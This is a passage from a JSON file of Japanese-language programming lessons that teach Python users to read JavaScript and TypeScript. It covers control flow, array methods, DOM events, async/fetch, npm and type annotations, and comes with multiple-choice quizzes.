     "body": "## このレッスンのゴール\n\n- `{ }` ブロックの if・for を読める\n- `for...of` と `for...in` の違いが分かる\n- 三項演算子 `? :` を読める\n\n## if\n\n```javascript\nif (score >= 80) {\n  console.log(\"よくできました\");\n} else if (score >= 60) {\n  console.log(\"合格\");\n} else {\n  console.log(\"もう少し\");\n}\n```\n\n- 条件は `( )` で囲む\n- ブロックは `{ }`。インデントは見やすさのためで、意味は持たない\n- `elif` → `else if`、`and / or / not` → `&& / || / !`\n\n## 三項演算子\n\n```javascript\nconst label = age >= 18 ? \"成人\" : \"未成年\";\n```\n\nPython の `\"成人\" if age >= 18 else \"未成年\"` と同じ。**`条件 ? 真のとき : 偽のとき`** の順です。\n\n## for の 3 種類\n\n```javascript\nconst fruits = [\"りんご\", \"バナナ\"];\n\nfor (const fruit of fruits) { ... }          // ① 値を 1 つずつ（Python の for と同じ）\nfor (let i = 0; i < fruits.length; i++) { }  // ② 番号で回す（C 言語風）\nfor (const key in user) { ... }              // ③ オブジェクトのキーを回す\n```\n\n`of` は値、`in` はキー。**配列には `of` を使う** と覚えましょう（`in` だと番号の文字列が出てきます）。\n\n② の読み方：`let i = 0`（最初に 1 回）→ `i < fruits.length`（毎回の条件）→ `i++`（毎回の最後に i を 1 増やす）。\n\n## while・break・continue\n\n```javascript\nlet n = 0;\nwhile (n < 3) {\n  n++;\n  if (n === 2) continue;\n  console.log(n);   // 1, 3\n}\n```\n\nPython とまったく同じ意味です。\n\n## switch\n\n```javascript\nswitch (command) {\n  case \"start\":\n    run();\n    break;          // ← 無いと次の case も実行されてしまう\n  default:\n    console.log(\"不明\");\n}\n```\n\nPython の `match` 文や if-elif の連続にあたります。**`break` 忘れ** は典型的なバグです。\n\n## 「真」とみなされる値\n\n`0`、`\"\"`、`null`、`undefined`、`NaN`、`false` が偽。\nPython と違い、**空の配列 `[]` や空のオブジェクト `{}` は真** なので注意！ 空かどうかは `arr.length === 0` で調べます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`x > 0 ? \"正\" : \"負か0\"` で x = -1 のときの値は？",
        "choices": [
         "\"正\"",
         "\"負か0\""
        ],
        "answer": 1,
        "explain": "条件が偽なので : の右側です。"
       },
       {
        "question": "配列の値を 1 つずつ取り出すのに適しているのは？",
        "choices": [
         "for (const v of arr)",
         "for (const v in arr)"
        ],
        "answer": 0,
        "explain": "in はキー（配列なら番号）を取り出します。"
       },
       {
        "question": "JavaScript で `if ([])` は？",
        "choices": [
         "真（実行される）",
         "偽（実行されない）"
        ],
        "answer": 0,
        "explain": "Python と違い、空配列は真です。"
       }
      ]
     ],
     "id": "02-control-flow"
    },
    {
     "title": "配列とオブジェクト",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "collections",
      "data_formats"
     ],
     "summary": "JavaScript のデータの入れ物と、分割代入・スプレッド構文。",
     "body": "## このレッスンのゴール\n\n- 配列とオブジェクトの基本操作を読める\n- 分割代入 `const { a } = obj` とスプレッド構文 `...` を読める\n\n## 配列（Python のリスト）\n\n```javascript\nconst nums = [10, 20, 30];\nnums[0];          // 10\nnums.length;      // 3（Python の len(nums)）\nnums.push(40);    // 末尾に追加（append）\nnums.includes(20) // true（Python の 20 in nums）\nnums.at(-1);      // 40（後ろから。nums[-1] は undefined になるので注意）\n```\n\n## オブジェクト（Python の辞書）\n\n```javascript\nconst user = { name: \"Ryo\", age: 20 };\nuser.name;        // \"Ryo\"（ドットでアクセス）\nuser[\"age\"];      // 20（キーが変数のときはこちら）\nuser.email;       // undefined（無いキーでもエラーにならない）\n```\n\nキーに `\" \"` が要らないのが Python との違いです。\nJSON は「JavaScript のオブジェクトの書き方」から生まれたので、見た目がそっくりです。\n\n## ?. と ??（AI のコードで頻出）\n\n```javascript\nconst city = user.address?.city;      // address が無ければ undefined（エラーにしない）\nconst name = user.nickname ?? \"名無し\"; // null / undefined なら右側を使う\n```\n\nPython の `user.get(\"address\", {}).get(\"city\")` と `or` の組み合わせにあたります。\n\n## 分割代入\n\n```javascript\nconst { name, age } = user;         // user.name と user.age を取り出す\nconst [first, second] = nums;       // 配列の先頭 2 つ\nfunction show({ name }) { ... }     // 引数で受け取るときにも使える\n```\n\nPython の `a, b = [1, 2]` を、オブジェクトにも使えるようにしたものです。React のコードで大量に出てきます。\n\n## スプレッド構文 ...\n\n```javascript\nconst more = [...nums, 50];                 // 配列を展開してつなげる\nconst updated = { ...user, age: 21 };       // コピーして age だけ変える\n```\n\n`{ ...user, age: 21 }` は「user のコピーを作り、age を上書き」。元の `user` は変わりません。\n**元を変えずに新しいものを作る** スタイルは、React などで重視されます。\n\n## 参照に注意（Python と同じ）\n\n```javascript\nconst a = [1, 2];\nconst b = a;   // 同じ配列を指す\nb.push(3);     // a も [1, 2, 3]\n```\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`const { age } = { name: \"A\", age: 3 }` のあと age は？",
        "choices": [
         "{ age: 3 }",
         "3",
         "undefined"
        ],
        "answer": 1,
        "explain": "オブジェクトから同じ名前のプロパティを取り出しています。"
       },
       {
        "question": "`user.profile?.bio` で profile が存在しない場合は？",
        "choices": [
         "エラーになる",
         "undefined になる",
         "空文字になる"
        ],
        "answer": 1,
        "explain": "?. は途中が無ければ undefined を返します。"
       },
       {
        "question": "`const c = { ...a, x: 1 }` の効果は？",
        "choices": [
         "a をコピーして x を 1 にした新しいオブジェクトを作る",
         "a の x を 1 に書き換える",
         "a と c が同じオブジェクトになる"
        ],
        "answer": 0,
        "explain": "スプレッドは浅いコピーを作ります。元の a は変わりません。"
       }
      ]
     ],
     "id": "03-arrays-objects"
    },
    {
     "title": "関数とアロー関数",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "functions",
      "higher_order",
      "scope"
     ],
     "summary": "function、=>、コールバック。JavaScript で最も重要な書き方。",
     "body": "## このレッスンのゴール\n\n- `function` とアロー関数 `=>` の両方を読める\n- 「関数を引数として渡す（コールバック）」を説明できる\n\n## 3 つの書き方\n\n```javascript\nfunction add(a, b) {          // ① 関数宣言\n  return a + b;\n}\n\nconst add2 = function (a, b) { // ② 関数式（変数に入れる）\n  return a + b;\n};\n\nconst add3 = (a, b) => a + b;  // ③ アロー関数（AI が最もよく書く）\n```\n\nすべて同じ働きです。\n\n## アロー関数の省略ルール\n\n```javascript\nconst double = (x) => { return x * 2; };  // 基本形\nconst double2 = (x) => x * 2;             // { } と return を省略（1 式だけのとき）\nconst double3 = x => x * 2;               // 引数が 1 つなら ( ) も省略可\nconst makeUser = (name) => ({ name });    // オブジェクトを返すときは ( ) で囲む\n```\n\n`=>` の右側に `{` が **無ければ、その式がそのまま戻り値** です。\nPython の `lambda x: x * 2` と同じ感覚ですが、JavaScript では複数行も書けます。\n\n## 関数は値（コールバック）\n\n```javascript\nbutton.addEventListener(\"click\", () => {\n  console.log(\"押された！\");\n});\n\nsetTimeout(() => console.log(\"1 秒後\"), 1000);\n```\n\n「クリックされたら、この関数を呼んでね」と **関数そのものを渡しています**。\nこれを **コールバック** と呼び、JavaScript では至る所に出てきます。読むときは\n「`=>` 以降は、**今ではなく、何かが起きたときに実行される**」と意識しましょう。\n\n## デフォルト引数・残余引数\n\n```javascript\nfunction greet(name = \"ゲスト\", ...rest) {\n  // rest は残りの引数の配列（Python の *args）\n}\n```\n\n## スコープ\n\n`let` / `const` は **`{ }` の中だけ** で有効です（ブロックスコープ）。Python は関数単位なので、ここは JavaScript の方が細かいです。\n\n```javascript\nif (true) {\n  const msg = \"中\";\n}\nconsole.log(msg);   // ReferenceError\n```\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`const f = (a, b) => a * b;` で `f(2, 3)` は？",
        "choices": [
         "6",
         "undefined",
         "5"
        ],
        "answer": 0,
        "explain": "{ } が無いので a * b がそのまま返ります。"
       },
       {
        "question": "`const f = (x) => { x * 2 };` で `f(3)` は？",
        "choices": [
         "6",
         "undefined"
        ],
        "answer": 1,
        "explain": "{ } があるときは return が必要です。よくあるバグです。"
       },
       {
        "question": "`addEventListener(\"click\", handle)` の handle はいつ実行される？",
        "choices": [
         "この行が実行された瞬間",
         "クリックされたとき"
        ],
        "answer": 1,
        "explain": "関数を渡しておき、イベントが起きたときに呼ばれます（コールバック）。"
       }
      ]
     ],
     "id": "04-functions-arrow"
    },
    {
     "title": "map・filter・reduce",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "higher_order",
      "collections"
     ],
     "summary": "AI のコードで毎回のように出てくる配列メソッドを読み解く。",
     "body": "## このレッスンのゴール\n\n- `map` / `filter` / `find` / `reduce` が何を返すか説明できる\n- メソッドチェーンを 1 段ずつ読める\n\n## 早見表\n\n| メソッド | 何をする？ | 返すもの | Python では |\n|---|---|---|---|\n| `map(f)` | 全要素を変換 | 同じ長さの新しい配列 | `[f(x) for x in arr]` |\n| `filter(f)` | 条件に合うものだけ残す | 短くなった新しい配列 | `[x for x in arr if f(x)]` |\n| `find(f)` | 条件に合う最初の 1 つ | 要素 1 つ（無ければ undefined） | `next((x for x in arr if f(x)), None)` |\n| `some(f)` / `every(f)` | 1 つでも / 全部 合うか | true / false | `any(...)` / `all(...)` |\n| `reduce(f, 初期値)` | 1 つの値にまとめる | 何でも | `functools.reduce` / `sum` |\n| `forEach(f)` | 各要素に処理（返さない） | undefined | 普通の for |\n\n## 例\n\n```javascript\nconst items = [\n  { name: \"ペン\", price: 120, stock: 3 },\n  { name: \"ノート\", price: 200, stock: 0 },\n  { name: \"消しゴム\", price: 80, stock: 5 },\n];\n\nconst names = items.map(item => item.name);           // [\"ペン\", \"ノート\", \"消しゴム\"]\nconst inStock = items.filter(item => item.stock > 0);  // ペンと消しゴム\nconst note = items.find(item => item.name === \"ノート\");\n```\n\n## reduce：たたみ込み\n\n```javascript\nconst total = items.reduce((sum, item) => sum + item.price, 0);  // 400\n```\n\n`(累積値, 今の要素) => 次の累積値` を繰り返します。\n\n| 回 | sum | item.price | 戻り値 |\n|---|---|---|---|\n| 1 | 0（初期値） | 120 | 120 |\n| 2 | 120 | 200 | 320 |\n| 3 | 320 | 80 | 400 |\n\nreduce が読みにくいときは、**この表を書けば必ず読めます**。\n\n## メソッドチェーン\n\n```javascript\nconst label = items\n  .filter(i => i.stock > 0)         // ① 在庫ありだけ\n  .map(i => `${i.name}(${i.price}円)`) // ② 文字列に変換\n  .join(\", \");                       // ③ つなげる\n// \"ペン(120円), 消しゴム(80円)\"\n```\n\n**上から 1 行ずつ「今どんな配列か」をメモしていく** のがコツです。\n\n## 引数の 2 番目\n\n```javascript\nitems.map((item, index) => `${index + 1}. ${item.name}`);\n```\n\nコールバックの 2 番目の引数は番号（Python の `enumerate`）。React でリストを表示するときに頻出です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`[1, 2, 3].map(x => x * 10)` の結果は？",
        "choices": [
         "[10, 20, 30]",
         "60",
         "[1, 2, 3]"
        ],
        "answer": 0,
        "explain": "map は全要素を変換した新しい配列を返します。"
       },
       {
        "question": "`[5, 8, 2].filter(x => x > 4)` の結果は？",
        "choices": [
         "[8]",
         "[5, 8]",
         "true"
        ],
        "answer": 1,
        "explain": "条件に合う要素をすべて残します。"
       },
       {
        "question": "`[1, 2, 3].reduce((a, b) => a + b, 10)` の結果は？",
        "choices": [
         "6",
         "16",
         "10"
        ],
        "answer": 1,
        "explain": "初期値 10 に 1, 2, 3 を順に足します。"
       }
      ]
     ],
     "id": "05-array-methods"
    },
    {
     "title": "DOM とイベント",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "dom_ui",
      "higher_order"
     ],
     "summary": "JavaScript で Web ページを動かす仕組み。",
     "body": "## このレッスンのゴール\n\n- DOM が「HTML を JavaScript から操作するための木構造」だと説明できる\n- 要素を探す → 変える → イベントで反応する、の流れを読める\n\n## DOM とは\n\nブラウザは HTML を読み込むと、それを **木の形のデータ（DOM）** に変換します。\nJavaScript はこの DOM を通して、ページの文字や見た目を書き換えます。\n\n```html\n<button id=\"like\">いいね</button>\n<p id=\"count\">0</p>\n```\n\n## 3 ステップ：探す → 変える → 反応する\n\n```javascript\n// ① 探す\nconst button = document.querySelector(\"#like\");   // CSS セレクタで 1 つ探す\nconst countEl = document.getElementById(\"count\");\n\n// ③ 反応する\nlet count = 0;\nbutton.addEventListener(\"click\", () => {\n  count++;\n  // ② 変える\n  countEl.textContent = count;\n  button.classList.add(\"liked\");\n});\n```\n\n| よく使うもの | 意味 |\n|---|---|\n| `querySelector(\".a\")` / `querySelectorAll` | CSS セレクタで要素を探す（1 つ / 全部） |\n| `textContent` | 中の文字 |\n| `innerHTML` | 中の HTML（⚠️ ユーザー入力を入れると危険） |\n| `classList.add / remove / toggle` | CSS クラスの付け外し |\n| `value` | 入力欄の値 |\n| `createElement` / `append` | 要素を作って追加 |\n\n## イベントの種類\n\n`click`、`input`（入力のたび）、`change`、`submit`（フォーム送信）、`keydown`、`DOMContentLoaded`（ページ読み込み完了）など。\n\n```javascript\nform.addEventListener(\"submit\", (event) => {\n  event.preventDefault();   // ページの再読み込み（標準動作）を止める\n  ...\n});\n```\n\n`event.preventDefault()` はフォームの処理でほぼ必ず見る 1 行です。\n\n## ⚠️ セキュリティ：innerHTML\n\n```javascript\nel.innerHTML = userInput;    // 危険：<script> などが実行されうる（XSS）\nel.textContent = userInput;  // 安全：ただの文字として表示\n```\n\nAI のコードでユーザー入力を `innerHTML` に入れていたら要注意です。\n\n## React などのフレームワーク\n\n実際の開発では、DOM を直接操作せず React・Vue などを使うことが多いです。\nそれでも「状態が変わる → 画面が書き換わる」「イベントでコールバックが呼ばれる」という考え方は同じです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`document.querySelector(\".item\")` は何を返す？",
        "choices": [
         "class=\"item\" の最初の要素",
         "class=\"item\" の全要素",
         "id=\"item\" の要素"
        ],
        "answer": 0,
        "explain": "全部ほしいときは querySelectorAll です。"
       },
       {
        "question": "ユーザーの入力をページに表示するとき、安全なのは？",
        "choices": [
         "textContent",
         "innerHTML"
        ],
        "answer": 0,
        "explain": "innerHTML は HTML として解釈されるため XSS の危険があります。"
       },
       {
        "question": "フォームの submit イベントで `event.preventDefault()` を呼ぶ理由は？",
        "choices": [
         "ページの再読み込みを止めて、JavaScript で処理するため",
         "フォームを空にするため",
         "二重送信を自動で防ぐため"
        ],
        "answer": 0,
        "explain": "標準ではページが再読み込みされてしまいます。"
       }
      ]
     ],
     "id": "06-dom-events"
    },
    {
     "title": "Promise と async/await・fetch",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "async",
      "http_api",
      "errors"
     ],
     "summary": "API からデータを取ってくるコードを読む。",
     "body": "## このレッスンのゴール\n\n- Promise が「あとで結果が届く約束」だと説明できる\n- `fetch` + `async/await` + `try/catch` の定番パターンを読める\n\n## なぜ非同期？\n\nネットからデータを取るのには時間がかかります。その間ページが固まってしまわないよう、\nJavaScript は **「結果はあとで渡すね」という約束（Promise）** をすぐ返し、処理を先に進めます。\n\n## 定番パターン\n\n```javascript\nasync function loadUsers() {\n  try {\n    const res = await fetch(\"https://api.example.com/users\");\n    if (!res.ok) {\n      throw new Error(`HTTP ${res.status}`);\n    }\n    const users = await res.json();\n    return users;\n  } catch (err) {\n    console.error(\"取得に失敗:\", err);\n    return [];\n  }\n}\n```\n\n1. `fetch(url)` でリクエスト → Promise が返る\n2. `await` で結果（レスポンス）を待つ\n3. `res.ok` で成功か確認（**fetch は 404 や 500 でもエラーにならない** ので、このチェックが必要）\n4. `await res.json()` で本文を JSON として読み込む（これも Promise）\n5. `try / catch` で失敗に備える（Python の try / except）\n\n## then で書く古い形\n\n```javascript\nfetch(url)\n  .then(res => res.json())\n  .then(users => console.log(users))\n  .catch(err => console.error(err));\n```\n\n`await` が登場する前の書き方です。意味は上と同じで、「終わったら（then）次へ」とつないでいます。\n\n## 複数を同時に\n\n```javascript\nconst [user, posts] = await Promise.all([\n  fetch(\"/api/user\").then(r => r.json()),\n  fetch(\"/api/posts\").then(r => r.json()),\n]);\n```\n\nPython の `asyncio.gather` と同じです。\n\n## POST で送る\n\n```javascript\nawait fetch(\"/api/posts\", {\n  method: \"POST\",\n  headers: { \"Content-Type\": \"application/json\" },\n  body: JSON.stringify({ title: \"こんにちは\" }),   // オブジェクト → JSON 文字列\n});\n```\n\n`JSON.stringify` / `JSON.parse` は Python の `json.dumps` / `json.loads` です。\n\n## よくあるミス\n\n```javascript\nconst data = fetch(url);   // await 忘れ → data は Promise（中身ではない）\nconsole.log(data.name);    // undefined\n```\n\nAI のコードでも `await` の付け忘れはときどきあります。**「この値は Promise か、中身か？」** を意識して読みましょう。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "fetch がサーバーから 404 を受け取ったとき、catch に飛ぶ？",
        "choices": [
         "はい",
         "いいえ。res.ok を自分でチェックする必要がある"
        ],
        "answer": 1,
        "explain": "fetch がエラーになるのはネットワーク自体の失敗のときです。"
       },
       {
        "question": "`await res.json()` の await を付け忘れると？",
        "choices": [
         "中身ではなく Promise が変数に入る",
         "エラーで止まる",
         "同じ結果になる"
        ],
        "answer": 0,
        "explain": "await で待たないと、結果ではなく「約束」が入ります。"
       },
       {
        "question": "`Promise.all([a, b])` の意味は？",
        "choices": [
         "a と b を同時に進め、両方の結果を待つ",
         "a が終わってから b を始める",
         "先に終わった方だけを返す"
        ],
        "answer": 0,
        "explain": "先に終わった方だけなら Promise.race です。"
       }
      ]
     ],
     "id": "07-promise-async"
    },
    {
     "title": "モジュールと npm・package.json",
     "level": 3,
     "minutes": 12,
     "concepts": [
      "modules",
      "tooling"
     ],
     "summary": "import / export と、JavaScript プロジェクトの構成ファイルを読む。",
     "body": "## このレッスンのゴール\n\n- `import` / `export` の書き方を読める\n- `package.json` の主な項目と `npm install` / `npm run` が分かる\n\n## export と import\n\n```javascript\n// math.js\nexport function add(a, b) { return a + b; }   // 名前付き export\nexport const PI = 3.14;\nexport default function main() { ... }         // default export（1 ファイル 1 つ）\n```\n\n```javascript\n// app.js\nimport main, { add, PI } from \"./math.js\";     // default は { } の外\nimport * as math from \"./math.js\";             // まとめて math.add のように使う\nimport React, { useState } from \"react\";       // ライブラリから\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `\"./math.js\"`（./ で始まる） | 自分のファイル |\n| `\"react\"`（名前だけ） | npm でインストールしたライブラリ |\n\n古いコードや Node.js では `const fs = require(\"fs\");` / `module.exports = ...` という書き方（CommonJS）も見ます。意味は同じです。\n\n## package.json：プロジェクトの設計書\n\n```json\n{\n  \"name\": \"my-app\",\n  \"scripts\": {\n    \"dev\": \"vite\",\n    \"build\": \"vite build\",\n    \"test\": \"vitest\"\n  },\n  \"dependencies\": {\n    \"react\": \"^18.3.1\"\n  },\n  \"devDependencies\": {\n    \"vite\": \"^5.4.0\"\n  }\n}\n```\n\n| 項目 | 意味 |\n|---|---|\n| `scripts` | `npm run dev` などで実行できるコマンドの一覧 |\n| `dependencies` | 動かすのに必要なライブラリ |\n| `devDependencies` | 開発中だけ必要なツール（ビルド・テスト） |\n| `^18.3.1` | 「18.x の範囲で新しいものを使ってよい」 |\n\n## よく使うコマンド\n\n```bash\nnpm install          # package.json の内容をインストール（node_modules/ ができる）\nnpm install axios    # ライブラリを追加\nnpm run dev          # scripts の dev を実行\n```\n\n`node_modules/` は巨大なので Git には含めません（`.gitignore` に書く）。\n`package-lock.json` は「実際に入れたバージョンの記録」で、こちらは Git に含めます。\n\n## Python との対応\n\n| Python | JavaScript |\n|---|---|\n| `pip install x` | `npm install x` |\n| requirements.txt / pyproject.toml | package.json |\n| `.venv/` | `node_modules/` |\n| `python main.py` | `node main.js` / `npm run ...` |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`import { useState } from \"react\"` の \"react\" は？",
        "choices": [
         "npm でインストールしたライブラリ",
         "同じフォルダの react.js"
        ],
        "answer": 0,
        "explain": "./ で始まらない名前はライブラリです。"
       },
       {
        "question": "`npm run build` が実行するのは？",
        "choices": [
         "package.json の scripts.build に書かれたコマンド",
         "build という名前のファイル",
         "npm のビルド機能"
        ],
        "answer": 0,
        "explain": "scripts はプロジェクト独自のコマンド集です。"
       },
       {
        "question": "Git に含めないのが普通なのは？",
        "choices": [
         "package.json",
         "package-lock.json",
         "node_modules/"
        ],
        "answer": 2,
        "explain": "npm install で再現できるので含めません。"
       }
      ]
     ],
     "id": "08-modules-npm"
    }
   ],
   "status": "open"
  },
  {
   "title": "TypeScript",
   "icon": "🔷",
   "order": 30,
   "description": "JavaScript に「型」を足した言語。AI が書く Web アプリの多くはこれ。JavaScript コースの次に。",
   "levels": {
    "1": "入門",
    "2": "基礎",
    "3": "実践"
   },
   "id": "30-typescript",
   "lessons": [
    {
     "title": "TypeScript とは？ 型注釈の読み方",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "type_hints",
      "types",
      "tooling"
     ],
     "summary": "JavaScript との関係と、`: string` のような型注釈の読み方。",
     "body": "## このレッスンのゴール\n\n- TypeScript が「JavaScript ＋ 型」で、最終的に JavaScript に変換されると説明できる\n- `変数: 型` / `(引数: 型): 戻り値の型` を読める\n\n## TypeScript ＝ JavaScript ＋ 型\n\n```typescript\nlet count: number = 0;\nconst name: string = \"Ryo\";\nlet isOpen: boolean = false;\n```\n\n`: number` などの部分が **型注釈** です。これを取り除くと、ただの JavaScript になります。\n実際、TypeScript は実行前に `tsc`（TypeScript コンパイラ）などで **型を消して JavaScript に変換** され、ブラウザや Node.js ではその JavaScript が動きます。\n\n| 拡張子 | 中身 |\n|---|---|\n| `.ts` | TypeScript |\n| `.tsx` | TypeScript ＋ JSX（React の画面部品） |\n| `.d.ts` | 型の情報だけを書いたファイル |\n\n## Python の型ヒントとの違い\n\n```python\ndef greet(name: str) -> str: ...        # Python\n```\n```typescript\nfunction greet(name: string): string { ... }   // TypeScript\n```\n\n見た目はそっくりですが、大きな違いがあります。\n\n| | Python の型ヒント | TypeScript |\n|---|---|---|\n| 型が合わないと | そのまま動く（注釈なだけ） | **実行前にエラー**（コンパイルエラー） |\n| チェックする人 | mypy などの別ツール | TypeScript 自身 |\n\n```typescript\nlet count: number = 0;\ncount = \"たくさん\";   // エラー: Type 'string' is not assignable to type 'number'.\n```\n\nこのエラー文は「string 型を number 型に入れることはできません」という意味です。TypeScript のエラーは **「A は B に代入できない」** の形が多いと覚えておくと読めます。\n\n## 型推論：書かなくても型は付く\n\n```typescript\nlet count = 0;        // 自動で number 型になる\nconst items = [1, 2]; // number[]\n```\n\nAI のコードで型注釈が無い変数も、TypeScript は **最初に入れた値から型を推測** しています。\nエディタで変数にマウスを乗せると、推測された型が見られます。\n\n## 関数の型\n\n```typescript\nfunction add(a: number, b: number): number {\n  return a + b;\n}\n\nconst double = (x: number): number => x * 2;\n\nfunction log(message: string): void {   // void ＝ 何も返さない\n  console.log(message);\n}\n```\n\n**`(...)` の後ろの `: 型` が戻り値の型** です。`void` は Python の `-> None` にあたります。\n\n## 基本の型\n\n| TypeScript | 意味 | Python では |\n|---|---|---|\n| `number` | 数値（整数も小数も） | `int` / `float` |\n| `string` | 文字列 | `str` |\n| `boolean` | 真偽値 | `bool` |\n| `null` / `undefined` | 値が無い | `None` |\n| `any` | 何でもあり（型チェックを諦める） | `Any` |\n| `unknown` | 何か分からない（使う前に確認が必要） | `object` に近い |\n\n⚠️ AI のコードで `any` がたくさん出てきたら、型の恩恵を捨てているサインです。レビューで確認したいポイントです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "TypeScript のコードは最終的にどうやって動く？",
        "choices": [
         "ブラウザが TypeScript をそのまま実行する",
         "型を取り除いて JavaScript に変換してから実行される",
         "Python に変換されて実行される"
        ],
        "answer": 1,
        "explain": "tsc やビルドツールが JavaScript に変換します。"
       },
       {
        "question": "`function f(x: string): number` の戻り値の型は？",
        "choices": [
         "string",
         "number",
         "void"
        ],
        "answer": 1,
        "explain": "( ) の後ろの `: number` が戻り値の型です。"
       },
       {
        "question": "`let n = 5; n = \"five\";` は TypeScript でどうなる？",
        "choices": [
         "問題なく動く",
         "型エラーになる"
        ],
        "answer": 1,
        "explain": "`let n = 5` で n は number と推論されるため、文字列は代入できません。"
       }
      ]
     ],
     "id": "01-what-is-typescript"
    },
    {
     "title": "配列とオブジェクトの型",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "type_hints",
      "collections"
     ],
     "summary": "`string[]`、`{ name: string }`、`?`（省略可能）を読む。",
     "body": "## このレッスンのゴール\n\n- 配列の型 `string[]` と `Array<string>` を読める\n- オブジェクトの型と、`?`（省略可能）・`readonly` を読める\n\n## 配列の型\n\n```typescript\nconst names: string[] = [\"Ryo\", \"Ken\"];\nconst scores: Array<number> = [80, 65];   // number[] と同じ意味\nconst pair: [string, number] = [\"Ryo\", 20]; // タプル：長さと順番が決まった配列\n```\n\n`string[]` は「文字列の配列」。Python の `list[str]` です。\n`[string, number]` は Python の `tuple[str, int]` にあたります。\n\n## オブジェクトの型\n\n```typescript\nconst user: { name: string; age: number } = {\n  name: \"Ryo\",\n  age: 20,\n};\n```\n\n`{ キー: 型; ... }` で、そのオブジェクトがどんな形をしているかを表します。\n足りないキーや、余分なキーがあるとエラーになります。\n\n## ? ＝ 省略してもよい\n\n```typescript\nconst user: { name: string; email?: string } = { name: \"Ryo\" };  // OK\n\nuser.email.toUpperCase();   // エラー：email は undefined かもしれない\nuser.email?.toUpperCase();  // OK：?. で「あれば」呼ぶ\n```\n\n`email?: string` は「email は無くてもいい」という意味で、実際の型は `string | undefined` になります。\nTypeScript は **「無いかもしれないもの」をそのまま使うと怒ってくれる** ので、バグを防げます。\n\n## readonly ＝ 書き換え禁止\n\n```typescript\nconst config: { readonly apiUrl: string } = { apiUrl: \"https://...\" };\nconfig.apiUrl = \"x\";   // エラー\n```\n\n## インデックスシグネチャ（辞書の型）\n\n```typescript\nconst prices: { [item: string]: number } = { apple: 120, banana: 80 };\nconst stock: Record<string, number> = { apple: 3 };   // 同じ意味の短い書き方\n```\n\nキーが自由な「辞書」のような使い方です。Python の `dict[str, int]` にあたります。\nAI のコードでは `Record<string, number>` の形をよく見ます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`number[]` と同じ意味の型は？",
        "choices": [
         "Array<number>",
         "[number]",
         "number"
        ],
        "answer": 0,
        "explain": "`[number]` は「number が 1 つだけのタプル」という別の意味になります。"
       },
       {
        "question": "`{ title: string; memo?: string }` に合うのは？",
        "choices": [
         "{ title: \"買い物\" }",
         "{ memo: \"牛乳\" }",
         "{ title: 1 }"
        ],
        "answer": 0,
        "explain": "memo は省略できますが、title は必須で string である必要があります。"
       },
       {
        "question": "`Record<string, boolean>` に合うデータは？",
        "choices": [
         "[\"a\", true]",
         "{ a: true, b: false }",
         "{ a: \"yes\" }"
        ],
        "answer": 1,
        "explain": "キーが文字列、値が boolean の辞書型オブジェクトです。"
       }
      ]
     ],
     "id": "02-arrays-objects-types"
    },
    {
     "title": "interface と type",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "type_hints",
      "classes"
     ],
     "summary": "型に名前を付けて使い回す 2 つの書き方。",
     "body": "## このレッスンのゴール\n\n- `interface` と `type` が「型に名前を付ける」ためのものだと説明できる\n- `extends` と `&` による型の組み合わせを読める\n\n## 型に名前を付ける\n\n毎回 `{ name: string; age: number }` と書くのは大変なので、名前を付けます。\n\n```typescript\ninterface User {\n  id: number;\n  name: string;\n  email?: string;\n}\n\ntype Product = {\n  id: number;\n  title: string;\n  price: number;\n};\n\nfunction showUser(user: User): string {\n  return `${user.id}: ${user.name}`;\n}\n```\n\nAI のコードでは、ファイルの上の方や `types.ts` に `interface` / `type` がずらっと並んでいることがよくあります。\n**ここを先に読むと、そのアプリが扱うデータの形が全部分かります**。コードを読むときの近道です。\n\n## Python で言うと\n\n```python\nfrom dataclasses import dataclass\n\n@dataclass\nclass User:\n    id: int\n    name: str\n    email: str | None = None\n```\n\nただし TypeScript の `interface` は **形の約束だけ** で、実行時には消えます（中身を作る機能はない）。\n\n## 型を広げる：extends と &\n\n```typescript\ninterface Admin extends User {   // User の項目 ＋ role\n  role: \"owner\" | \"editor\";\n}\n\ntype AdminUser = User & { role: string };   // & で合体（ほぼ同じ意味）\n```\n\n## interface と type の違いは？\n\n| | `interface` | `type` |\n|---|---|---|\n| オブジェクトの形 | ◯ | ◯ |\n| ユニオン型（次のレッスン）など | ✕ | ◯ |\n| 広げ方 | `extends` | `&` |\n\n読む側としては **「どちらも型に名前を付けている」と理解すれば十分** です。チームやライブラリの好みで使い分けられています。\n\n## 構造的型付け\n\n```typescript\nconst p = { id: 1, name: \"Ryo\", age: 20 };\nshowUser(p);   // OK！ User と「同じ形」を持っていれば通る\n```\n\nTypeScript は名前ではなく **形（構造）** で型を判断します。「User として作ったか」ではなく「User に必要な項目を持っているか」が大事です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "AI が書いた TypeScript のプロジェクトで、データの形を手っ取り早く知るには？",
        "choices": [
         "interface や type の定義（types.ts など）を読む",
         "一番下の行から読む",
         "package.json を読む"
        ],
        "answer": 0,
        "explain": "型定義を読むと、アプリが扱うデータの全体像が分かります。"
       },
       {
        "question": "`interface Admin extends User { role: string }` の Admin が持つ項目は？",
        "choices": [
         "role だけ",
         "User の項目すべてと role",
         "User の項目だけ"
        ],
        "answer": 1,
        "explain": "extends は「引き継いで足す」です。"
       },
       {
